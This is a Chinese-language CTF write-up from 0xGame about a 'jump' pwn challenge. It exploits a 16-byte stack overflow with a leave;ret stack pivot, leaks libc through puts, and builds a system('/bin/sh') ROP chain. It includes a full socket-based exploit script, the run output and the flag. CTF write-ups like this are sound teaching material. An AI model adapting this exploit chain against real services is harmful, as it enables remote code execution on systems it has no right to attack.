---
title: "跳一跳：16 字节溢出与栈迁移"
date: "2026-10-07"
categories: "Pwn"
tags: ["ROP", "栈迁移", "leave ret"]
excerpt: "用有限溢出覆盖 saved rbp 和 rip，将执行栈迁到全局缓冲区，再接第二段 ROP。"
slug: "pwn-jump"
source_event: "0xGame"
---

> 复现材料：`pwn`、`libc.so.6`。赛题附件未随文章打包。

## 思路概览

程序给了一个 0x200 字节的 `.bss` 全局缓冲区作为 “safe house”，随后在 0x10 字节栈缓冲区里读取 0x20 字节。虽然只有 16 字节溢出，但刚好能覆盖 saved rbp 和 saved rip，用 `leave; ret` 把栈迁移到全局缓冲区。

## 解题过程

### Step 1: 确认保护和关键位置

`checksec` 结果：NX 开启、No PIE、No Canary、Partial RELRO。关键地址固定：

- `global_buf = 0x4047a0`
- `pop rdi; ret = 0x40123f`
- `leave; ret = 0x40129a`
- `puts@plt = 0x401040`
- `puts@got = 0x404020`

`vuln()` 的逻辑是先 `readn(0, global_buf, 0x200)`，再 `readn(0, rbp-0x10, 0x20)`。第二次读取只多出 16 字节，但正好覆盖 saved rbp/saved rip：

```text
payload = b"B" * 0x10 + p64(global_buf) + p64(leave_ret)
```

函数 epilogue 的第一次 `leave; ret` 先把 `rbp` 变成 `global_buf`，跳到 `leave; ret` 后第二次执行时，`rsp` 就被迁移到 `global_buf`，开始执行提前放好的 ROP。

### Step 2: 泄漏 libc 并利用“蠢”的二次读取

第一段 ROP 用 `puts(puts@got)` 泄漏 libc，再返回 `vuln`：

```text
fake_rbp | ret | pop_rdi_ret | puts_got | puts_plt | ret | vuln
```

返回 `vuln` 后，此时程序的栈已经在 `global_buf` 附近。下一次 `readn(0, global_buf, 0x200)` 会把输入写到当前栈区域上，导致 `readn` 自己的 saved rbp 和 saved rip 被覆盖：

- `global_buf + 0x10`：`readn` saved rbp
- `global_buf + 0x18`：`readn` saved rip

所以第二段不需要再等 “Step 2”，直接在下一次 0x200 输入里把 `global_buf+0x18` 布置成最终 ROP：

```text
offset 0x00: padding
offset 0x10: fake rbp
offset 0x18: ret
offset 0x20: pop rdi; ret
offset 0x28: "/bin/sh"
offset 0x30: system
offset 0x38: exit
```

完整脚本如下，无需 pwntools：

```python
#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "challenge.example.invalid"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31833

GLOBAL_BUF = 0x4047A0
PUTS_PLT = 0x401040
PUTS_GOT = 0x404020
VULN = 0x401244
POP_RDI_RET = 0x40123F
RET = 0x401240
LEAVE_RET = 0x40129A

LIBC_PUTS = 0x80E10
LIBC_SYSTEM = 0x50D70
LIBC_EXIT = 0x455F0
LIBC_BIN_SH = 0x1D8678

STEP1_PROMPT = b"Step 1: Send your ROP payload to the safe house:\n"
STEP2_PROMPT = b"Step 2: Trigger the pivot:\n"


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 10.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(data)
        data += chunk
    return data


def first_stage() -> bytes:
    rop = b"".join(
        [
            p64(GLOBAL_BUF),
            p64(RET),
            p64(POP_RDI_RET),
            p64(PUTS_GOT),
            p64(PUTS_PLT),
            p64(RET),
            p64(VULN),
        ]
    )
    return rop.ljust(0x200, b"A")


def pivot_payload() -> bytes:
    return b"B" * 0x10 + p64(GLOBAL_BUF) + p64(LEAVE_RET)


def second_stage(libc_base: int) -> bytes:
    system = libc_base + LIBC_SYSTEM
    bin_sh = libc_base + LIBC_BIN_SH
    exit_addr = libc_base + LIBC_EXIT

    rop = b"".join(
        [
            b"X" * 0x10,
            p64(GLOBAL_BUF),
            p64(RET),
            p64(POP_RDI_RET),
            p64(bin_sh),
            p64(system),
            p64(exit_addr),
        ]
    )
    return rop.ljust(0x200, b"C")


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        recv_until(sock, STEP1_PROMPT)
        sock.sendall(first_stage())
        recv_until(sock, STEP2_PROMPT)
        sock.sendall(pivot_payload())

        leak_block = recv_until(sock, STEP1_PROMPT)
        leak = leak_block.split(STEP1_PROMPT)[0].strip(b"\n")
        puts_addr = struct.unpack("<Q", leak[:8].ljust(8, b"\x00"))[0]
        libc_base = puts_addr - LIBC_PUTS
        if libc_base & 0xFFF:
            raise RuntimeError(f"unexpected libc base: {libc_base:#x}")

        print(f"puts@libc = {puts_addr:#x}")
        print(f"libc base = {libc_base:#x}")

        sock.sendall(second_stage(libc_base))
        time.sleep(0.3)
        sock.sendall(b"cat /flag /flag.txt ./flag 2>/dev/null; echo DONE\n")

        output = b""
        sock.settimeout(3)
        while b"DONE" not in output:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            output += chunk

    match = re.search(rb"0xGame\{[^}\r\n]+\}", output)
    if match:
        print(match.group(0).decode())
    else:
        print(output.decode(errors="replace"))


if __name__ == "__main__":
    main()
```

## 验证记录

本地静态核验：

```bash
checksec --file=./pwn
readelf -sW ./libc.so.6 | grep -E ' puts@@| system@@| exit@@'
strings -a -tx ./libc.so.6 | grep /bin/sh
```

远程验证：

```bash
python solve.py
```

输出：

```text
puts@libc = 0x7f842b1efe10
libc base = 0x7f842b16f000
0xGame{c9ee137e-69a0-47b2-be93-2e88db2bb7ba}
```

## 最终结果

```text
0xGame{c9ee137e-69a0-47b2-be93-2e88db2bb7ba}
```
